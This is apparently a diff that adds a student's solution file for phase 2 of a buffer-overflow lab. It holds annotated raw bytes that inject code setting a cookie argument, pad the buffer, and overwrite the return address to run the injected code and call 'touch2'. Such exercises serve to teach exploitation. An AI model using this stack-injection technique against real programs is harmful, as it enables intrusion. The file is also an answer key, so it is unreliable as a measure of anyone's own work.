@@ -1,0 +1,23 @@
+/* Phase 2 Injected Code */
+
+/* First set param for touch2 to cookie value */
+
+bf 77 6b 20 70 c3			/* mov $0x70206b77,%rdi AND retq */
+      	    	
+
+/* Now pad to the end of buf with junk (40-6 = 34) */
+
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 
+
+/* Point to start of injected code in %rdi */
+
+c8 ab 61 55 00 00 00 00 	        /* Orig. address of %rdi */
+
+
+/* Finally, point to address of touch2 */
+
+63 19 40 00 00 00 00 00					
